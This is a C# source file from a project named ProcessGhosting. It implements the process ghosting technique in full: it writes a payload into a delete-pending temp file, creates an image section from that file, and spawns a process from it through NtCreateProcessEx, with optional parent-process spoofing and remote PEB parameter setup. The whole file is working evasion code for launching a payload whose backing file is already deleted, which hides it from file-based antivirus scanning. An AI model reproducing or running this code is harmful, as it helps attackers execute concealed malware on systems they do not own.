﻿using System;
using System.Runtime.InteropServices;
using ProcessGhosting.Interop;

namespace ProcessGhosting.Library
{
    using NTSTATUS = Int32;

    internal class Utilities
    {
        public static IntPtr CreateDeletePendingFileSection(string tmpFilePath, byte[] payload)
        {
            NTSTATUS ntstatus;
            IntPtr hDeletePendingFile;
            IntPtr hSection = Win32Consts.INVALID_HANDLE_VALUE;
            int nSizeIoStatusBlock = Marshal.SizeOf(typeof(IO_STATUS_BLOCK));
            IntPtr pIoStatusBlock = Marshal.AllocHGlobal(nSizeIoStatusBlock);
            var fileDispositionInfo = new FILE_DISPOSITION_INFORMATION(true);

            do
            {
                hDeletePendingFile = OpenDeletePendingFile(tmpFilePath);

                if (hDeletePendingFile == Win32Consts.INVALID_HANDLE_VALUE)
                    break;

                ntstatus = NativeMethods.NtSetInformationFile(
                    hDeletePendingFile,
                    pIoStatusBlock,
                    in fileDispositionInfo,
                    (uint)Marshal.SizeOf(typeof(FILE_DISPOSITION_INFORMATION)),
                    FILE_INFORMATION_CLASS.FileDispositionInformation);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to set information to file.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                    break;
                }

                ntstatus = NativeMethods.NtWriteFile(
                    hDeletePendingFile,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    pIoStatusBlock,
                    payload,
                    (uint)payload.Length,
                    IntPtr.Zero,
                    IntPtr.Zero);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to write image data to file.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                    break;
                }

                ntstatus = NativeMethods.NtCreateSection(
                    out hSection,
                    ACCESS_MASK.SECTION_ALL_ACCESS,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    SECTION_PROTECTIONS.PAGE_READONLY,
                    SECTION_ATTRIBUTES.SEC_IMAGE,
                    hDeletePendingFile);
                NativeMethods.NtClose(hDeletePendingFile);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    hSection = Win32Consts.INVALID_HANDLE_VALUE;
                    Console.WriteLine("[-] Failed to create section in delete pending file.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                }
            } while (false);

            Marshal.FreeHGlobal(pIoStatusBlock);

            if (hDeletePendingFile != Win32Consts.INVALID_HANDLE_VALUE)
                NativeMethods.NtClose(hDeletePendingFile);

            return hSection;
        }


        public static IntPtr CreateGhostingProcess(IntPtr hDeletePendingSection, int ppid)
        {
            NTSTATUS ntstatus;
            IntPtr hParent;
            CLIENT_ID clientId;
            var objectAttributes = new OBJECT_ATTRIBUTES();

            if (ppid > 0)
            {
                clientId = new CLIENT_ID { UniqueProcess = new IntPtr(ppid) };

                ntstatus = NativeMethods.NtOpenProcess(
                    out hParent,
                    ACCESS_MASK.PROCESS_CREATE_PROCESS,
                    in objectAttributes,
                    in clientId);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[!] Failed to open parent process.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));

                    hParent = new IntPtr(-1);
                }
            }
            else
            {
                hParent = new IntPtr(-1);
            }

            ntstatus = NativeMethods.NtCreateProcessEx(
                out IntPtr hDeletePendingProcess,
                ACCESS_MASK.PROCESS_ALL_ACCESS,
                IntPtr.Zero,
                hParent,
                NT_PROCESS_CREATION_FLAGS.INHERIT_HANDLES,
                hDeletePendingSection,
                IntPtr.Zero,
                IntPtr.Zero,
                BOOLEAN.FALSE);
            NativeMethods.NtClose(hDeletePendingSection);

            if (hParent != new IntPtr(-1))
                NativeMethods.NtClose(hParent);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
            {
                hDeletePendingProcess = IntPtr.Zero;
                Console.WriteLine("[-] Failed to create ghosting process.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
            }

            return hDeletePendingProcess;
        }


        public static void RebaseProcessParameters(
            IntPtr pLocalProcessParameters,
            IntPtr pRemoteProcessParameters,
            bool toLocalPointers,
            bool containsEnvironment)
        {
            ulong nBaseOffset;
            IntPtr pBasePointer;
            IntPtr pTempPointer;
            IntPtr pVerify;
            IntPtr pOverwrite;
            var processParameters = (RTL_USER_PROCESS_PARAMETERS)Marshal.PtrToStructure(
                pLocalProcessParameters,
                typeof(RTL_USER_PROCESS_PARAMETERS));
            ulong nSizeStructure = (ulong)processParameters.MaximumLength;
            ulong nDataSize = nSizeStructure;

            if (containsEnvironment)
                nDataSize += processParameters.EnvironmentSize;

            if (toLocalPointers)
            {
                pBasePointer = pRemoteProcessParameters;
                nBaseOffset = (ulong)(pLocalProcessParameters.ToInt64() - pRemoteProcessParameters.ToInt64());
            }
            else
            {
                pBasePointer = pLocalProcessParameters;
                nBaseOffset = (ulong)(pRemoteProcessParameters.ToInt64() - pLocalProcessParameters.ToInt64());
            }

            for (int nPosition = 0; nPosition < (int)nSizeStructure; nPosition += IntPtr.Size)
            {
                pTempPointer = new IntPtr(pLocalProcessParameters.ToInt64() + nPosition);
                pVerify = Marshal.ReadIntPtr(pTempPointer);

                if ((ulong)(pVerify.ToInt64() - pBasePointer.ToInt64()) < nDataSize)
                {
                    pOverwrite = new IntPtr(pVerify.ToInt64() + (long)nBaseOffset);
                    Marshal.WriteIntPtr(pTempPointer, pOverwrite);
                }
            }
        }


        public static IntPtr OpenDeletePendingFile(string filePath)
        {
            NTSTATUS ntstatus;
            string ntFilePath = string.Format(@"\??\{0}", filePath);
            IntPtr pIoStatusBlock = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IO_STATUS_BLOCK)));
            var objectAttributes = new OBJECT_ATTRIBUTES(
                ntFilePath,
                OBJECT_ATTRIBUTES_FLAGS.OBJ_CASE_INSENSITIVE);

            ntstatus = NativeMethods.NtOpenFile(
                out IntPtr hFile,
                ACCESS_MASK.DELETE | ACCESS_MASK.SYNCHRONIZE | ACCESS_MASK.GENERIC_READ | ACCESS_MASK.GENERIC_WRITE,
                in objectAttributes,
                pIoStatusBlock,
                FILE_SHARE_ACCESS.READ | FILE_SHARE_ACCESS.WRITE,
                FILE_OPEN_OPTIONS.SYNCHRONOUS_IO_NONALERT | FILE_OPEN_OPTIONS.SUPERSEDE);
            Marshal.FreeHGlobal(pIoStatusBlock);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to open \"{0}\".", ntFilePath);
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));

                return Win32Consts.INVALID_HANDLE_VALUE;
            }

            return hFile;
        }


        public static IntPtr SetProcessParameters(
            IntPtr hProcess,
            string imagePathName,
            string commandLine,
            string currentDirectory,
            string windowTitle)
        {
            NTSTATUS ntstatus;
            bool status;
            IntPtr pPeb;
            IntPtr pLocalEnvironment;
            IntPtr pRemoteProcessParametersPointer;
            IntPtr pRemoteProcessParameters;
            IntPtr pDataBuffer;
            int nSizeParameters;
            int nSizeEnvironment;
            int nSizeBuffer;
            int nOffsetProcessParameters;
            int nOffsetEnvironmentSize;
            int nPageOffset;
            string winDir = Environment.GetEnvironmentVariable("windir");
            var unicodeImagePathName = new UNICODE_STRING(imagePathName);
            var unicodeCommandline = new UNICODE_STRING(commandLine);
            var unicodeCurrentDirectory = new UNICODE_STRING(currentDirectory);
            var unicodeWindowTitle = new UNICODE_STRING(windowTitle);
            var dllPath = new UNICODE_STRING(string.Format(@"{0}\System32", winDir));
            var desktopInfo = new UNICODE_STRING(@"WinSta0\Default");

            pPeb = Helpers.GetPebAddress(hProcess);

            if (pPeb == IntPtr.Zero)
                return IntPtr.Zero;

            nOffsetEnvironmentSize = Marshal.OffsetOf(
                    typeof(RTL_USER_PROCESS_PARAMETERS),
                    "EnvironmentSize").ToInt32();

            if (IntPtr.Size == 4)
            {
                nOffsetProcessParameters = Marshal.OffsetOf(
                    typeof(PEB32_PARTIAL),
                    "ProcessParameters").ToInt32();
                pRemoteProcessParametersPointer = new IntPtr(
                    pPeb.ToInt32() + nOffsetProcessParameters);
            }
            else
            {
                nOffsetProcessParameters = Marshal.OffsetOf(
                    typeof(PEB64_PARTIAL),
                    "ProcessParameters").ToInt32();
                pRemoteProcessParametersPointer = new IntPtr(
                    pPeb.ToInt64() + nOffsetProcessParameters);
            }

            pLocalEnvironment = Helpers.GetCurrentEnvironmentAddress();

            if (pLocalEnvironment == IntPtr.Zero)
                return IntPtr.Zero;

            ntstatus = NativeMethods.RtlCreateProcessParametersEx(
                    out IntPtr pLocalProcessParameters,
                    in unicodeImagePathName,
                    in dllPath,
                    in unicodeCurrentDirectory,
                    in unicodeCommandline,
                    pLocalEnvironment,
                    in unicodeWindowTitle,
                    in desktopInfo,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    RTL_USER_PROC_FLAGS.PARAMS_NORMALIZED);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
                return IntPtr.Zero;

            nPageOffset = (int)(pLocalProcessParameters.ToInt64() - (pLocalProcessParameters.ToInt64() & ~(0xFFF)));
            nSizeParameters = Marshal.ReadInt32(pLocalProcessParameters); // MaxLength
            nSizeEnvironment = (int)Marshal.ReadInt64(new IntPtr(
                pLocalProcessParameters.ToInt64() +
                nOffsetEnvironmentSize));
            nSizeBuffer = nSizeParameters + nSizeEnvironment;

            pRemoteProcessParameters = Helpers.AllocateReadWriteMemory(
                hProcess,
                IntPtr.Zero,
                (uint)(nSizeBuffer + 0x1000));

            if (pRemoteProcessParameters == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to allocate memory.");

                return IntPtr.Zero;
            }

            pRemoteProcessParameters = new IntPtr(pRemoteProcessParameters.ToInt64() + nPageOffset);

            RebaseProcessParameters(
                pLocalProcessParameters,
                pRemoteProcessParameters,
                false,
                true);

            status = Helpers.WriteMemory(
                hProcess,
                pRemoteProcessParameters,
                pLocalProcessParameters,
                (uint)nSizeBuffer);
            NativeMethods.RtlDestroyProcessParameters(pLocalProcessParameters);

            if (!status)
            {
                Console.WriteLine("[-] Failed to write process parameters.");

                return IntPtr.Zero;
            }

            pDataBuffer = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(pDataBuffer, pRemoteProcessParameters);

            status = Helpers.WriteMemory(
                hProcess,
                pRemoteProcessParametersPointer,
                pDataBuffer,
                (uint)IntPtr.Size);

            Marshal.FreeHGlobal(pDataBuffer);

            if (!status)
                return IntPtr.Zero;

            return pRemoteProcessParameters;
        }
    }
}
